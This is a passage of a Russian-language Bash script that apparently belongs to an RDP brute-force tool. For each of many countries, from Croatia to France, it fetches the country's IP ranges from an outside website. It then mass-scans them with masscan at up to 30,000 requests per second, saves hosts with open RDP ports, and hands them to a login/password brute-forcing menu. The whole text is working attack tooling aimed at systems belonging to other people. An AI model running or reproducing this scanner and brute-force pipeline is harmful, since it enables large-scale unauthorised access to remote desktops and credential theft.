echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "46" ]; then
curl http://ipdiapazon.16mb.com/Croatia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "47" ]; then
curl http://ipdiapazon.16mb.com/Cuba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "48" ]; then
curl http://ipdiapazon.16mb.com/Cyprus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "49" ]; then
curl http://ipdiapazon.16mb.com/Czech_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "50" ]; then
curl http://ipdiapazon.16mb.com/Denmark.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "51" ]; then
curl http://ipdiapazon.16mb.com/Djibouti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "52" ]; then
curl http://ipdiapazon.16mb.com/Dominican_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "53" ]; then
curl http://ipdiapazon.16mb.com/Ecuador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "54" ]; then
curl http://ipdiapazon.16mb.com/Egypt.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "55" ]; then
curl http://ipdiapazon.16mb.com/El_salvador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "56" ]; then
curl http://ipdiapazon.16mb.com/Eritrea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "57" ]; then
curl http://ipdiapazon.16mb.com/Estonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "58" ]; then
curl http://ipdiapazon.16mb.com/Ethiopia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "59" ]; then
curl http://ipdiapazon.16mb.com/European_union.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "60" ]; then
curl http://ipdiapazon.16mb.com/Faroe_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "61" ]; then
curl http://ipdiapazon.16mb.com/Fiji.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "62" ]; then
curl http://ipdiapazon.16mb.com/Finland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "63" ]; then
curl http://ipdiapazon.16mb.com/France.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
